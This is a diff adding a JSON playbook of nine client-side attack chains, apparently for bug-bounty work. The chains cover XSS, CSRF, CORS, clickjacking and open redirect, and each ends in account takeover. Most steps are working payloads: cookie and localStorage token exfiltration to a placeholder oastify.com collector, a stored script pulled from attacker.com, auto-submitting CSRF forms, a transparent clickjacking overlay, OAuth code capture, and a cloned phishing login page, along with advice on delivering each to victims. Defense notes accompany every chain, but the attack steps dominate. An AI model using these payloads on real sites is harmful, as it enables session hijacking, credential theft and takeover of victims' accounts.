@@ -1,0 +1,504 @@
+{
+  "domain": "Client-Side",
+  "domainLabel": "XSS / CSRF / клиент → ATO",
+  "domainOrder": 5,
+  "source": "ARS3NAL",
+  "chains": [
+    {
+      "title": "Ссылка на чужую сессию: Reflected XSS → кража cookie → ATO",
+      "level": "newbie",
+      "impact": "Полный угон сессии любого, кто откроет ссылку; reflected XSS платят, эскалация до ATO через кражу cookie.",
+      "why": "Канонический сценарий «одна ссылка = их аккаунт» и самый быстрый прыжок от отражения к реальному импакту.",
+      "precondition": "Параметр без санитизации отражается в HTML/JS-ответ И session-cookie выдана без флага HttpOnly.",
+      "tags": [
+        "xss",
+        "reflected",
+        "cookie-theft",
+        "ato"
+      ],
+      "realWorld": "PortSwigger 'Exploiting cross-site scripting to steal cookies'; общая техника.",
+      "defense": "HttpOnly на session-cookie убивает кражу через document.cookie; кодируйте вывод и включите CSP script-src 'self'.",
+      "steps": [
+        {
+          "title": "Найти отражаемый параметр",
+          "kind": "command",
+          "q": "dalfox",
+          "detail": "inject a unique canary ?q=ars3nal_canary7331 and grep the raw response for the un-encoded marker"
+        },
+        {
+          "title": "Подтвердить выполнение JS",
+          "kind": "payload",
+          "q": "XSS Injection",
+          "detail": "HTML context: \"><svg onload=alert(document.domain)>  |  attribute break: \" autofocus onfocus=alert(document.domain) x=\"",
+          "success": "выполнился alert(document.domain) = подтверждённый XSS"
+        },
+        {
+          "title": "Проверить флаг HttpOnly",
+          "kind": "note",
+          "detail": "curl -sI https://target/ | grep -i set-cookie; if HttpOnly is absent on session=, document.cookie theft works"
+        },
+        {
+          "title": "Заменить alert() на эксфильтрацию",
+          "kind": "payload",
+          "q": "XSS Injection",
+          "detail": "\"><script>new Image().src='https://YOUR.oastify.com/c?'+encodeURIComponent(document.cookie)</script>",
+          "success": "session-cookie жертвы прилетает на ваш Collaborator"
+        },
+        {
+          "title": "Доставить ссылку и поймать cookie",
+          "kind": "note",
+          "q": "",
+          "detail": "URL-encode the payload into the vulnerable param and send to the victim; watch Burp Collaborator / webhook.site"
+        },
+        {
+          "title": "Воспроизвести украденную cookie",
+          "kind": "note",
+          "detail": "paste session=... into the Cookie header (or browser), refresh, you are now logged in as the victim"
+        },
+        {
+          "title": "Заблокировать жертве доступ → ATO",
+          "kind": "checklist",
+          "q": "xss",
+          "detail": "from the hijacked session change email then password to finish the takeover"
+        }
+      ]
+    },
+    {
+      "title": "Едем на сессии: Stored XSS → обход HttpOnly → ATO",
+      "level": "intermediate",
+      "impact": "ATO даже при HttpOnly-cookie и CSRF-токенах; сохранённый пейлоад бьёт по каждому, кто откроет страницу.",
+      "why": "Показывает, что HttpOnly не стена: сессия едет вместе с любым same-origin fetch, который делает ваш JS.",
+      "precondition": "Сохраняемый ввод рендерится другим пользователям (имя профиля, комментарий, тикет), session-cookie HttpOnly, чувствительное действие защищено CSRF-токеном из DOM или эндпоинта.",
+      "tags": [
+        "xss",
+        "stored",
+        "httponly-bypass",
+        "csrf-token",
+        "ato"
+      ],
+      "realWorld": "'How We Turned a Medium XSS into a High Bounty by Bypassing HttpOnly Cookie' (Sec-88); HackerOne #123900.",
+      "defense": "CSP + автоэкранирование фреймворка останавливают инъекцию; double-submit токены бесполезны, когда JS работает same-origin, поэтому лечится только устранением XSS.",
+      "steps": [
+        {
+          "title": "Внедрить сохраняемый пейлоад",
+          "kind": "payload",
+          "q": "XSS Injection",
+          "detail": "<script src=//attacker.com/p.js></script> stored in a profile/comment field; it runs when an admin views the page"
+        },
+        {
+          "title": "Подтвердить, что cookie недоступна",
+          "kind": "note",
+          "detail": "curl -sI shows HttpOnly on session=, so document.cookie is empty; pivot to riding the session via same-origin fetch"
+        },
+        {
+          "title": "Снять CSRF-токен same-origin",
+          "kind": "payload",
+          "q": "Cross-Site Request Forgery",
+          "detail": "fetch('/account',{credentials:'include'}).then(r=>r.text()).then(t=>token=t.match(/name=\"csrf\" value=\"([^\"]+)\"/)[1])"
+        },
+        {
+          "title": "Сменить состояние от имени жертвы",
+          "kind": "payload",
+          "q": "Account Takeover",
+          "detail": "fetch('/account/email',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'csrf='+token+'&email={EMAIL}'})"
+        },
+        {
+          "title": "(Альт.) Эксфильтровать чувствительный DOM",
+          "kind": "payload",
+          "q": "XSS Injection",
+          "detail": "fetch('/api/me').then(r=>r.text()).then(d=>new Image().src='https://YOUR.oastify.com/?'+btoa(d))  // lift API keys / PII"
+        },
+        {
+          "title": "Захватить канал восстановления → ATO",
+          "kind": "checklist",
+          "q": "xss",
+          "detail": "trigger password reset to the attacker email you just set for full ATO"
+        }
+      ]
+    },
+    {
+      "title": "Призрак фрагмента: DOM XSS через location/hash-sink → ATO",
+      "level": "intermediate",
+      "impact": "Клиентский XSS, срабатывающий из #fragment (на сервер не уходит, невидим для WAF и логов) и ведущий к краже сессии/токена и ATO; массово в современных SPA.",
+      "why": "Баг живёт целиком в JavaScript, поэтому серверные фильтры и WAF его не видят; искать нужно в клиенте.",
+      "precondition": "Клиентский JS читает источник (location.hash, location.search, document.referrer, postMessage) и передаёт его в sink (innerHTML, document.write, eval, jQuery $(), location=).",
+      "tags": [
+        "xss",
+        "dom-xss",
+        "hash-sink",
+        "spa",
+        "ato"
+      ],
+      "realWorld": "PortSwigger 'DOM-based cross-site scripting' labs; общая техника.",
+      "defense": "Используйте безопасные sink (textContent, setAttribute), включите Trusted Types; фрагмент обходит серверные контроли, поэтому обязателен ревью клиентского JS.",
+      "steps": [
+        {
+          "title": "Сопоставить источники и sink",
+          "kind": "note",
+          "detail": "in DevTools search the bundle for location.hash / innerHTML / eval / document.write, or run Burp DOM Invader and watch the canary flow"
+        },
+        {
+          "title": "Подтвердить срабатывание sink",
+          "kind": "payload",
+          "q": "XSS Injection",
+          "detail": "innerHTML sink: target/#<img src=x onerror=alert(document.domain)>  |  href/location sink: target/#javascript:alert(document.domain)",
+          "success": "alert сработал из #fragment = DOM XSS"
+        },
+        {
+          "title": "Учесть особенности фреймворка",
+          "kind": "note",
+          "q": "",
+          "detail": "jQuery $(location.hash) takes #<img src=x onerror=...>; Angular/legacy templates may need a known CSTI/sandbox-escape gadget"
+        },
+        {
+          "title": "Вооружить до кражи токена",
+          "kind": "payload",
+          "q": "XSS Injection",
+          "detail": "#<img src=x onerror=\"fetch('https://YOUR.oastify.com/?t='+localStorage.getItem('access_token')+';'+document.cookie)\">"
+        },
+        {
+          "title": "Доставить ссылку с фрагментом",
+          "kind": "note",
+          "q": "",
+          "detail": "everything after # never reaches the server, so no WAF or log entry; send the URL straight to the victim"
+        },
+        {
+          "title": "Воспроизвести украденный JWT/cookie → ATO",
+          "kind": "checklist",
+          "q": "xss",
+          "detail": "set the bearer token or cookie, hit /api/me, take over the account"
+        }
+      ]
+    },
+    {
+      "title": "Тихая подмена email: form CSRF → ATO (пробелы SameSite и метода)",
+      "level": "newbie",
+      "impact": "Захват email без взаимодействия → сброс пароля → полный ATO с одного визита; классика CSRF-ATO.",
+      "why": "Хлеб с маслом CSRF: если у «смены email» нет валидного токена, одна автосабмит-страница забирает аккаунт.",
+      "precondition": "Эндпоинт смены email/пароля, session-cookie уходит cross-site (SameSite=None, нет SameSite на не-Chrome, окно Lax+POST в 2 минуты, или GET-эндпоинт), валидного анти-CSRF токена нет.",
+      "tags": [
+        "csrf",
+        "samesite",
+        "email-change",
+        "ato"
+      ],
+      "realWorld": "PortSwigger CSRF labs (token not tied to session / duplicated in cookie / SameSite Lax bypass via method override); общая техника.",
+      "defense": "Per-session серверно проверяемый CSRF-токен плюс SameSite=Lax/Strict, и повторный запрос текущего пароля при смене email/пароля.",
+      "steps": [
+        {
+          "title": "Перехватить запрос смены email",
+          "kind": "note",
+          "detail": "in Burp submit the real form, note method, params and any csrf token"
+        },
+        {
+          "title": "Проверить, настоящий ли токен",
+          "kind": "checklist",
+          "q": "csrf",
+          "detail": "remove the csrf param, then blank it, then swap in another user's token; if the change still succeeds the token is decorative"
+        },
+        {
+          "title": "Изучить cookie и SameSite",
+          "kind": "note",
+          "detail": "curl -sI target reads Set-Cookie: no SameSite or SameSite=None means cross-site POST works; default Lax means force a fresh login then fire within the 2-minute Lax+POST window"
+        },
+        {
+          "title": "Собрать автосабмит-PoC",
+          "kind": "payload",
+          "q": "Cross-Site Request Forgery",
+          "detail": "<form action=\"https://target/account/email\" method=\"POST\"><input name=\"email\" value=\"{EMAIL}\"></form><script>document.forms[0].submit()</script>",
+          "success": "email аккаунта сменился без участия жертвы"
+        },
+        {
+          "title": "(GET-вариант) однострочник",
+          "kind": "payload",
+          "q": "Cross-Site Request Forgery",
+          "detail": "<script>location='https://target/account/email?email={EMAIL}'</script>  (Lax sends the cookie on a top-level GET navigation; an <img> tag would NOT)"
+        },
+        {
+          "title": "(Вариант с подменой метода)",
+          "kind": "note",
+          "q": "",
+          "detail": "if POST-only but it honors _method=POST or X-HTTP-Method-Override, smuggle it through a Lax-friendly top-level GET nav"
+        },
+        {
+          "title": "Отправить страницу, затем сбросить → ATO",
+          "kind": "checklist",
+          "q": "csrf",
+          "detail": "victim opens it, email flips, run forgot-password for full ATO"
+        }
+      ]
+    },
+    {
+      "title": "JSON, который не безопасен: JSON CSRF через Content-Type → ATO",
+      "level": "intermediate",
+      "impact": "CSRF против «только-JSON, защищённого CORS» API, который все считают неуязвимым → захват аккаунта.",
+      "why": "Убивает миф, что JSON-API нельзя CSRF-нуть: трюк с text/plain полностью пропускает CORS-preflight.",
+      "precondition": "Эндпоинт парсит JSON-тело, но не требует строго Content-Type: application/json (принимает и text/plain), использует cookie-аутентификацию, CSRF-токена нет.",
+      "tags": [
+        "csrf",
+        "json-csrf",
+        "content-type",
+        "ato"
+      ],
+      "realWorld": "PentesterLab 'JSON CSRF'; HackTricks CSRF (text/plain bypass); класс CVE Fastify по content-type.",
+      "defense": "Требуйте Content-Type: application/json серверно И добавьте CSRF-токен или кастомный заголовок вроде X-Requested-With, форсирующий preflight.",
+      "steps": [
+        {
+          "title": "Подтвердить нестрогий разбор content-type",
+          "kind": "note",
+          "detail": "replay the JSON request changing Content-Type: application/json to text/plain; if it still updates, it is exploitable"
+        },
+        {
+          "title": "Понять, почему нет preflight",
+          "kind": "note",
+          "q": "",
+          "detail": "text/plain is a CORS simple content type, so the browser sends it cross-site with cookies and no OPTIONS preflight"
+        },
+        {
+          "title": "Собрать form-смугл (text/plain)",
+          "kind": "payload",
+          "q": "Cross-Site Request Forgery",
+          "detail": "<form action=\"https://target/api/account\" method=\"POST\" enctype=\"text/plain\"><input name='{\"email\":\"{EMAIL}\",\"x\":\"' value='\"}'></form>  (body assembles to valid JSON with a throwaway key)"
+        },
+        {
+          "title": "(fetch-вариант)",
+          "kind": "payload",
+          "q": "Cross-Site Request Forgery",
+          "detail": "fetch('https://target/api/account',{method:'POST',credentials:'include',headers:{'Content-Type':'text/plain'},body:'{\"email\":\"{EMAIL}\"}'})"
+        },
+        {
+          "title": "Автосабмит и доставка",
+          "kind": "payload",
+          "q": "Cross-Site Request Forgery",
+          "detail": "<script>document.forms[0].submit()</script> hosted on attacker.com, link sent to the victim"
+        },
+        {
+          "title": "Сбросить на новый email → ATO",
+          "kind": "checklist",
+          "q": "csrf",
+          "detail": "forgot-password to {EMAIL} for full ATO"
+        }
+      ]
+    },
+    {
+      "title": "Cross-origin утечка: CORS misconfig → эксфильтрация авторизованных данных → ATO",
+      "level": "intermediate",
+      "impact": "Чтение авторизованных ответов жертвы cross-origin (API-ключи, PII, токены) с любой страницы, которую она открывает → часто ATO.",
+      "why": "Один слишком щедрый Access-Control-Allow-Origin превращает «их залогиненные данные» в «ваши» без всякого XSS.",
+      "precondition": "Чувствительный авторизованный эндпоинт возвращает Access-Control-Allow-Credentials: true и либо отражает Origin атакующего, либо принимает null, либо доверяет управляемому атакующим поддомену.",
+      "tags": [
+        "cors",
+        "misconfiguration",
+        "data-exfil",
+        "ato"
+      ],
+      "realWorld": "PortSwigger 'CORS vulnerability with basic origin reflection' и 'trusted null origin' labs.",
+      "defense": "Никогда не отражайте Origin и не разрешайте null вместе с Allow-Credentials: true; используйте строгий серверный allowlist точных origin.",
+      "steps": [
+        {
+          "title": "Заметить заголовок",
+          "kind": "note",
+          "detail": "replay an authed request adding Origin: https://evil.com; check the response for Access-Control-Allow-Origin: https://evil.com plus Allow-Credentials: true"
+        },
+        {
+          "title": "Классифицировать дефект",
+          "kind": "checklist",
+          "q": "cors",
+          "detail": "arbitrary reflected Origin / null accepted / trusts *.target.com (take over a sub) / regex bug like target.com.evil.com"
+        },
+        {
+          "title": "Собрать PoC для reflected-origin",
+          "kind": "payload",
+          "q": "CORS Misconfiguration",
+          "detail": "fetch('https://api.target/accountDetails',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://YOUR.oastify.com/?'+encodeURIComponent(d)))",
+          "success": "ответ /accountDetails с API-ключом прилетает на Collaborator"
+        },
+        {
+          "title": "(Вариант null-origin)",
+          "kind": "payload",
+          "q": "CORS Misconfiguration",
+          "detail": "host the PoC in <iframe sandbox=\"allow-scripts\" srcdoc=\"<script>...</script>\"> so the request carries Origin: null and gets reflected"
+        },
+        {
+          "title": "Захостить по HTTPS и доставить",
+          "kind": "note",
+          "q": "",
+          "detail": "victim visits your page while logged in; their API key or PII lands on Collaborator"
+        },
+        {
+          "title": "Использовать украденный ключ/токен → ATO",
+          "kind": "checklist",
+          "q": "account-takeover",
+          "detail": "authenticate with the exfiltrated API key or session token for ATO"
+        }
+      ]
+    },
+    {
+      "title": "Один скрытый клик: clickjacking → смена состояния → ATO",
+      "level": "newbie",
+      "impact": "Заставить залогиненную жертву одним скрытым кликом выполнить чувствительное действие (смена email, добавление атакующего в админы, согласие OAuth) → ATO; зависит от импакта, часто.",
+      "why": "Самый дешёвый PoC: чистый HTML без баги в скрипте, когда чувствительная страница фреймится и действие переживает cross-site фрейм.",
+      "precondition": "Чувствительная страница фреймится (нет X-Frame-Options, нет CSP frame-ancestors), действие дружелюбно к GET или top-level форме, session-cookie уходит внутри фрейма (SameSite=None или first-party flow).",
+      "tags": [
+        "clickjacking",
+        "ui-redressing",
+        "state-change",
+        "ato"
+      ],
+      "realWorld": "PortSwigger Clickjacking labs (change email; frame-buster bypass); 'DoubleClickjacking' (2025).",
+      "defense": "Отдавайте X-Frame-Options: DENY или CSP frame-ancestors 'none'; SameSite=Lax/Strict на session-cookie притупляет фреймовые авторизованные действия.",
+      "steps": [
+        {
+          "title": "Проверить фреймируемость",
+          "kind": "note",
+          "detail": "curl -sI https://target/account | grep -iE 'x-frame-options|content-security-policy'; if absent and <iframe src=https://target/account> renders, it is clickjackable"
+        },
+        {
+          "title": "Найти целевой контрол",
+          "kind": "note",
+          "q": "",
+          "detail": "find the on-screen position of the Change email / Confirm button inside the framed page"
+        },
+        {
+          "title": "Предзаполнить значение",
+          "kind": "payload",
+          "q": "Clickjacking",
+          "detail": "if the field accepts a query param, frame https://target/account?email={EMAIL} so only one click is needed"
+        },
+        {
+          "title": "Собрать прозрачный оверлей",
+          "kind": "payload",
+          "q": "Clickjacking",
+          "detail": "<style>iframe{opacity:0.0001;position:absolute;top:-Npx;left:-Mpx;z-index:2}#decoy{z-index:1}</style><div id=decoy>Click to win</div><iframe sandbox=\"allow-forms allow-scripts allow-same-origin\" src=\"https://target/account?email={EMAIL}\"></iframe>"
+        },
+        {
+          "title": "Совместить приманку с реальной кнопкой",
+          "kind": "note",
+          "q": "",
+          "detail": "tweak top/left until Click to win sits exactly over Confirm; allow-forms neutralizes frame-buster scripts"
+        },
+        {
+          "title": "(Вариант DoubleClickjacking)",
+          "kind": "note",
+          "q": "",
+          "detail": "for SPA confirm dialogs that resist framing, use the 2025 double-click timing trick"
+        },
+        {
+          "title": "Доставить и конвертировать → ATO",
+          "kind": "checklist",
+          "q": "clickjacking",
+          "detail": "victim clicks, email changes, password reset, ATO"
+        }
+      ]
+    },
+    {
+      "title": "Одолженный логин: open redirect → кража OAuth code/token → ATO",
+      "level": "intermediate",
+      "impact": "Кража авторизационного code или access-токена жертвы, затем вход как она без пароля → полный ATO; один из самых рентабельных чейнов, часто.",
+      "why": "«Низкий» open redirect на OAuth-клиенте становится критическим ATO, как только встраивается в consent-flow.",
+      "precondition": "Цель использует OAuth/SSO, и валидация redirect_uri у провайдера слабая (разрешает подпути или поддомены) ИЛИ на разрешённом redirect-хосте есть open redirect, отбрасывающий code вам.",
+      "tags": [
+        "open-redirect",
+        "oauth",
+        "code-theft",
+        "ato"
+      ],
+      "realWorld": "HackerOne #1861974 (pixiv redirect_uri path traversal), #665651 (GSA OAuth token); PortSwigger 'Stealing OAuth access tokens via an open redirect'.",
+      "defense": "Exact-match allowlist redirect_uri (без wildcard и подпутей), форсируйте PKCE и одноразовый state, привязывайте code к точному redirect.",
+      "steps": [
+        {
+          "title": "Перехватить OAuth-запрос",
+          "kind": "note",
+          "detail": "record /authorize?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&state=..."
+        },
+        {
+          "title": "Прощупать валидацию redirect_uri",
+          "kind": "checklist",
+          "q": "open-redirect",
+          "detail": "try target.com.evil.com, target.com@evil.com, /callback/../redirect?url=evil.com, path traversal, an extra subdomain"
+        },
+        {
+          "title": "Найти open redirect на разрешённом хосте",
+          "kind": "payload",
+          "q": "Open Redirect",
+          "detail": "https://target/login?next=https://evil.com  or  /redirect?url=//evil.com  (confirm a 30x to attacker)"
+        },
+        {
+          "title": "Связать провайдера и редирект",
+          "kind": "note",
+          "q": "",
+          "detail": "set redirect_uri to the allowed host's open redirect so the provider hands the code to a trusted URL that 302s to evil.com, leaking code in the query (and the prior code in Referer; token in the # fragment for implicit flow)"
+        },
+        {
+          "title": "Собрать ловушку",
+          "kind": "note",
+          "detail": "page at evil.com logs: new Image().src='https://YOUR.oastify.com/?'+encodeURIComponent(location.href+'|'+document.referrer)",
+          "success": "authorization code жертвы прилетает на ваш листенер"
+        },
+        {
+          "title": "Доставить authorize-ссылку",
+          "kind": "note",
+          "q": "",
+          "detail": "send the crafted /authorize?... link; the victim, already logged into the provider, is bounced and the code lands on you"
+        },
+        {
+          "title": "Обменять code → сессия → ATO",
+          "kind": "note",
+          "detail": "POST the stolen code to /token (or replay the callback URL) to mint the victim's session"
+        }
+      ]
+    },
+    {
+      "title": "Приманка на доверенном домене: open redirect → фишинг учёток → ATO",
+      "level": "newbie",
+      "impact": "Кража учёток через ссылку, которая реально стартует на доверенном домене цели и ведёт на пиксель-в-пиксель фейковый логин → ATO; сам по себе, но высокая успешность в реале.",
+      "why": "Учит вооружать «скучный» open redirect для социнженерии и почему ревьюеры не должны его отметать.",
+      "precondition": "Open redirect на доверенном домене цели через параметр вроде ?returnUrl=, ?next=, ?url=, ?redirect=.",
+      "tags": [
+        "open-redirect",
+        "phishing",
+        "credential-theft",
+        "ato"
+      ],
+      "realWorld": "'Open Redirect to OAuth/credential ATO' (Bug Bounty Playbook); общая техника.",
+      "defense": "Allowlist целей редиректа только относительными путями, показывайте интерстишл при переходе на внешний сайт, не отражайте сырой пользовательский URL в Location.",
+      "steps": [
+        {
+          "title": "Найти параметр редиректа",
+          "kind": "command",
+          "q": "loxs",
+          "detail": "fuzz ?next= ?url= ?returnUrl= ?dest= with https://evil.com and //evil.com; confirm a 30x or JS location= to attacker"
+        },
+        {
+          "title": "Обойти слабые фильтры",
+          "kind": "payload",
+          "q": "Open Redirect",
+          "detail": "//evil.com, https:evil.com, https://target.com.evil.com, https://evil.com%23.target.com, /%2f/evil.com, whitelisted-prefix tricks"
+        },
+        {
+          "title": "Убедиться, что уходит с origin",
+          "kind": "note",
+          "q": "",
+          "detail": "the browser actually lands on evil.com starting from a target.com/... link (the trust anchor the victim sees)"
+        },
+        {
+          "title": "Поднять двойник логина",
+          "kind": "note",
+          "detail": "clone the real login page (wget -mk or the SingleFile extension) and point the form action to your collector"
+        },
+        {
+          "title": "Добавить реализма после входа",
+          "kind": "note",
+          "q": "",
+          "detail": "after capturing creds, redirect back to the real site logged-out so it reads as a harmless glitch"
+        },
+        {
+          "title": "Доставить ссылку и собрать → ATO",
+          "kind": "checklist",
+          "q": "open-redirect",
+          "detail": "send https://target.com/login?next=https://evil.com/login; the victim's username and password POST to your server, then log in as them"
+        }
+      ]
+    }
+  ]
+}
